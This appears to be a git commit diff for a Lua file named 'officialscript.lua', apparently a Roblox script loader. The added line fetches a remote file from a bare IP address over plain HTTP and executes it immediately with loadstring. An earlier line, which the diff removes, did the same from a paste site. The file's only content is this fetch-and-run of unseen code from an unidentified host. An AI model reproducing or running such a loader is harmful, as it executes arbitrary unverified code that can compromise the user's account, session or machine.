129b89b57c5a57aa310cd9716da924c60c4fb14d
n9owns <n9owns@gmail.com>
2025-10-31 22:02:33 +0000

    Update officialscript.lua

--- officialscript.lua
+++ officialscript.lua
@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://paste.debian.net/plainh/b667b1bc/", true))()
+ID="a0839b2a-94c6-4e9f-b55f-37c3531ca671";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
